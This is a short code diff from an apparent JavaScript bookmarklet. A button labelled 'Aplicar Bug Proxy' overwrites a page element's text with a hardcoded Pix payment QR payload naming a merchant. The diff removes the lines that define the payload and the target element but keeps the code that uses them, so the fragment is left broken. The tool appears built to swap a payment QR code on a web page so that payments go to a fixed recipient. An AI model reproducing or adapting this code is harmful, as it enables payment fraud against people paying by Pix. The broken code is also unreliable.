@@ -49,8 +49,6 @@ javascript:(function() {
     // Ação do botão "Aplicar Bug Proxy"
     document.getElementById('actionButton').addEventListener('click', () => {
         // Código para aplicar o proxy
-        var newQRText = "00020101021226910014br.gov.bcb.pix2569qrcode.pix.celcoin.com.br/pixqrcode/v2/80eb31117b3f31fd620bc1336cbd045204000053039865802BR5908Pagsmile6009Sao Paulo62070503***6304898D";
-        var element = document.querySelector(".floating-snap-btn-wrapper");
 
         if (element) {
             element.innerText = newQRText;
